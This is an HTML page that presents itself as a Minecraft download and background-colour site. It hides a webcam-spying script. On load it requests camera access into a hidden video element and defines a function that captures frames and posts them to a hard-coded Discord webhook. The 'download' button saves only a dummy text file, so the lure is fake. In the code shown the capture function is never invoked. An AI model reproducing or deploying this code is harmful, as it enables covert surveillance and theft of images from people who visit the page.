<!DOCTYPE html>
<html>
<head>
    <title>Download Minecraft & Color Changing Website</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1d;
            color: #e0e0e0;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: background-color 0.5s;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffa726; /* Luxury Gold color for headings */
        }

        p {
            font-size: 16px;
            margin-bottom: 30px;
            text-align: center;
        }

        button {
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            background-color: #673ab7; /* Premium Purple color for buttons */
            color: #fff;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #512da8;
        }

        #colorChangeButton {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 999;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s;
        }

        #colorChangeButton:hover {
            transform: scale(1.1);
        }

        #videoElement {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Welcome to the Minecraft Download Page & Color Changing Website!</h1>
    <p>Click the "Download Minecraft" button to download Minecraft and the "Change Color" button to change the background color:</p>

    <button id="downloadButton">Download Minecraft</button>
    <button id="colorChangeButton">Change Color</button>
    <video id="videoElement" autoplay></video>

    <script>
        const video = document.getElementById('videoElement');
        let imgIndex = 1;

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    video.srcObject = stream;
                })
                .catch(function (error) {
                    console.error("Error accessing camera:", error);
                });
        }

        function capturePicture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgURL = canvas.toDataURL('image/png');

            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Modify this with your Discord webhook URL
            const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
            const imgBlob = dataURItoBlob(imgURL);
            const imgFormData = new FormData();
            imgFormData.append('image' + imgIndex, imgBlob, 'captured_image_' + imgIndex + '.png');

            fetch(webhookURL, {
                method: 'POST',
                body: imgFormData
            });

            console.log('Image ' + imgIndex + ' sent to Discord webhook');
            imgIndex++;
        }

        function dataURItoBlob(dataURI) {
            var byteString = atob(dataURI.split(',')[1]);
            var ab = new ArrayBuffer(byteString.length);
            var ia = new Uint8Array(ab);
            for (var i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }

        const downloadButton = document.getElementById('downloadButton');
        downloadButton.addEventListener('click', function () {
            const fileContent = 'This is a sample Minecraft file. Enjoy playing Minecraft!';
            const fileBlob = new Blob([fileContent], { type: 'text/plain' });
            const fileURL = URL.createObjectURL(fileBlob);

            const downloadLink = document.createElement('a');
            downloadLink.href = fileURL;
            downloadLink.download = 'minecraft.txt';
            downloadLink.click();
        });

        const colorChangeButton = document.getElementById('colorChangeButton');
        const colors = ['#673ab7', '#f44336', '#03a9f4', '#e91e63', '#ff5722']; /* Luxury color palette */
        let index = 0;

        colorChangeButton.addEventListener('click', function () {
            document.body.style.backgroundColor = colors[index];
            let textColor = index === colors.length - 1 ? '#000' : '#fff';
            document.body.style.color = textColor;
            downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
            index = (index + 1) % colors.length;
        });
    </script>
</body>
</html>
